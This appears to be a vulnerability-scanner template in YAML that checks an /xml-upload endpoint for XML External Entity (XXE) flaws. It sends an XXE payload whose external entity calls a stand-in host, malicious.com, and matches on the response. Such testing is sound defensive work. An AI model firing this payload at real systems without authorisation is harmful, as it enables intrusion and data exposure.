name: XML External Entities Vulnerability Test
description: Test for XML External Entity (XXE) vulnerabilities.
severity: High
author: Project
tags:
  - xxe
  - xml

http:
  - method: POST
    path:
      - "{{BaseURL}}/xml-upload"
    body:
      - "<?xml version='1.0' encoding='ISO-8859-1' ?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM 'http://malicious.com/malicious.xml' >]><foo>&xxe;</foo>"
    headers:
      Content-Type: application/xml
    matchers:
      - type: word
        words:
          - "malicious"
        condition: or
